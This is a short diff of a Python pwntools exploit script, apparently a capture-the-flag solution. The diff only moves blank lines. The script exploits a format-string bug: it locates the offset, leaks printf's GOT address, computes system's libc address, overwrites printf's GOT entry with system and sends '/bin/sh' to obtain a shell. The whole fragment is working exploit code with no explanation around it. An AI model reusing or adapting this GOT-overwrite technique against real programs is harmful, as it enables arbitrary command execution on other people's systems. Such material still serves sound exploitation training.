@@ -10,7 +10,6 @@ def exec_fmt(payload):
     return info
 auto = FmtStr(exec_fmt)
 offset = auto.offset
-
 printf_got = elf.got['printf']
 payload = p32(printf_got)+'%{}$s'.format(offset).encode()
 io.send(payload)
@@ -19,6 +18,7 @@ system_addr = printf_addr-(libc.symbols['printf']-libc.symbols['system'])
 log.info("system_addr=>%s"%hex(system_addr))
 
 payload = fmtstr_payload(offset,{printf_got:system_addr})
+
 io.send(payload)
 io.send('/bin/sh')
 io.recv()
